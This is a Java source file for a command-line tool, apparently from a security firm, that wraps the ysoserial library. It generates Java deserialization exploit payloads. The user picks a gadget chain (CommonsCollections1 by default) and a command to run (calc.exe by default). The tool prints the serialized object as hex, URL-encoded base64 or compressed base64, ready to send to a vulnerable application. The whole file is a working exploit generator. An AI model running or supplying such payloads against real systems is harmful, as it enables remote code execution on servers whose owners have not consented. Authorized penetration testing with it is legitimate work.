package com.softwaresecured;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.zip.DeflaterOutputStream;

import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;

import org.apache.commons.cli.Options;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Option.Builder;
// import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;


public class Deserial {

   private static final int INTERNAL_ERROR_CODE = 70;
   private static final int USAGE_CODE = 64;

   private final static char[] hexArray = "0123456789ABCDEF".toCharArray();

   private static byte[] compressBytes( byte[] aBytes ) {

      byte[] lCompressedBytes = null;

      try {

         ByteArrayOutputStream lByteOutputStream = new ByteArrayOutputStream();
         DeflaterOutputStream lDeflaterOutputStream = new DeflaterOutputStream( lByteOutputStream );
         lDeflaterOutputStream.write( aBytes );
         lDeflaterOutputStream.flush();
         lDeflaterOutputStream.close();
         lByteOutputStream.close();

         lCompressedBytes = lByteOutputStream.toByteArray();

      } catch ( IOException e ) {
         e.printStackTrace();
      }
      return lCompressedBytes;
   }

   public static String bytesToHex(byte[] bytes) {
       char[] hexChars = new char[bytes.length * 2];
       for ( int j = 0; j < bytes.length; j++ ) {
           int v = bytes[j] & 0xFF;
           hexChars[j * 2] = hexArray[v >>> 4];
           hexChars[j * 2 + 1] = hexArray[v & 0x0F];
       }
       return new String(hexChars);
   }

   public static void main( final String[] args) {

      Options options = new Options();

      Option help = new Option( "help", "print this message" );

      Option payloadOption = Option.builder( "payload" )
                                .hasArg()
                                .desc( "The ysoserial payload to use" )
                                .build();

      Option commandOption = Option.builder( "command" )
                                .hasArg()
                                .desc( "The command you want the payload to run" )
                                .build();

      Option outputOption = Option.builder( "output" )
                                .hasArg()
                                .desc( "The output type" )
                                .build();

      options.addOption( help );
      options.addOption( payloadOption );
      options.addOption( commandOption );
      options.addOption( outputOption );

      // automatically generate the help statement
      HelpFormatter formatter = new HelpFormatter();

      // Defaults
      String payloadType = "CommonsCollections1";
      String command = "calc.exe";
      String output = "hex";

      CommandLineParser parser = new DefaultParser();

      try {
        CommandLine line = parser.parse( options, args );

        if ( line.hasOption( "help" ) ) {
            formatter.printHelp( "deserial", options );
            System.exit(0);
        }

        if ( line.hasOption( "payload" ) ) {
            payloadType = line.getOptionValue( "payload" );
        }
        if ( line.hasOption( "command" ) ) {
            command = line.getOptionValue( "command" );
        }
        if ( line.hasOption( "output" ) ) {
            output = line.getOptionValue( "output" );
        }
      }
      catch( ParseException exp ) {
          // oops, something went wrong
          // System.err.println( "Parsing failed.  Reason: " + exp.getMessage() );

          formatter.printHelp( "deserial", options );
      }

      // System.out.println(payloadType);
      // System.out.println(command);
      // System.out.println(output);

      final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass( payloadType );

      try {

         ByteArrayOutputStream out = new ByteArrayOutputStream();

         ObjectPayload payload = payloadClass.newInstance();
         final Object object = payload.getObject( command );

         Serializer.serialize( object, out );

         byte[] content = out.toByteArray();

         String b64encoded = Base64.getEncoder().encodeToString( content );
         String compressedB64Encoded =
               Base64.getEncoder().encodeToString( compressBytes( content ) );

        if (output.equals("hex")) {
          System.out.println( bytesToHex(content) );
        } else if (output.equals("base64")) {
          System.out.println( URLEncoder.encode( b64encoded, "UTF-8" ) );
        } else if (output.equals("compressed")) {
          System.out.println( URLEncoder.encode( compressedB64Encoded, "UTF-8" ) );
        }

        ObjectPayload.Utils.releasePayload( payload, object );

      } catch ( Throwable e ) {
         System.err.println( "Error while generating or serializing payload" );
         e.printStackTrace();
         System.exit(INTERNAL_ERROR_CODE);
      }
   }
}
